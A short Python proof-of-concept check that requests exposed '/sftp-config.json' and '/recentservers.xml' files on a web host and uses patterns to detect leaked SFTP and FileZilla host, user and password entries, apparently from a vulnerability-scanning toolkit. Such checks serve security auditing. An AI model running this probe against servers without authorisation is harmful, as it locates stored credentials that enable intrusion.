import re
import requests

def poc(url):
    if '://' not in url:
        url = 'http://' + url
    if not url.endswith('/'):
        url = url + "/"
    url = url.rstrip("/")
    variants = [
        "/sftp-config.json",
        "/recentservers.xml"
    ]
    header = dict()
    header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    for f in variants:
        _ = url + f
        try:
            r = requests.get(_, headers=header)
            if re.search(r'("type":[\s\S]*?"host":[\s\S]*?"user":[\s\S]*?"password":[\s\S]*")', r.text,
                         re.I | re.S | re.M):
                return "[sftp] " + _ 
            elif re.search(r'(<Pass>[\s\S]*?<\/Pass>)', r.text, re.I):
                return "[sftp] " + _ 
        except Exception: 
            pass
